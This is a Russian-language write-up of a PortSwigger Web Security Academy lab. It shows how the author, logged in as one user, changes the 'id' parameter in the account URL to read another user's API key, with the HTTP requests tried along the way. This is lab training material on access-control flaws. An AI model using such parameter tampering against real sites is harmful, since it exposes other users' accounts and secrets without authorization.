---
title: "User ID controlled by request parameter"
date: 2025-07-17
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter"
classes: wide
---

Для решения лабы нужно получить `API` токен пользователя `carlos`. Для входа есть креды от учетной записи `wiener`:`peter`.

```
https://0a48009d04e7fa778098948800df006c.web-security-academy.net/
```

## Solution

Зайду в данную учетку. 

Ничего интересного не вижу, кроме функции изменения почты. Попробую это сделать:

```http
POST /my-account/change-email HTTP/2
Host: 0a48009d04e7fa778098948800df006c.web-security-academy.net
Cookie: session=Ps1zcdu7m7TTe4808VPrxUKDXSuWKRn9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a48009d04e7fa778098948800df006c.web-security-academy.net/my-account?id=wiener
Content-Type: application/x-www-form-urlencoded
Content-Length: 59
Origin: https://0a48009d04e7fa778098948800df006c.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

email=mail%40mail.com&csrf=ZtSk4EzKiCJQNaeRPb3EMaBcu3GtKrPr
```

Попробую изменить значение в теле запроса:

```http
POST /my-account/change-email HTTP/2
Host: 0a48009d04e7fa778098948800df006c.web-security-academy.net
Cookie: session=Ps1zcdu7m7TTe4808VPrxUKDXSuWKRn9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a48009d04e7fa778098948800df006c.web-security-academy.net/my-account?id=wiener
Content-Type: application/x-www-form-urlencoded
Content-Length: 55
Origin: https://0a48009d04e7fa778098948800df006c.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

username=new_name&csrf=Rl2U5qcaKmFk73pWIeHEhEvMWI8XpJqG
```

Запрос обработан, но ничего путного не вышло. Попробую сделать еще проще: в `URL` указано имя `wiener` в параметре `id`, подставлю `carlos`)

```
https://0a48009d04e7fa778098948800df006c.web-security-academy.net/my-account?id=carlos
```

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_access_control/IMG_User_ID_controlled_by_request_parameter/1.png){: height="200" .align-center}

Сдам `API` ключ:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_access_control/IMG_User_ID_controlled_by_request_parameter/2.png){: height="200" .align-center}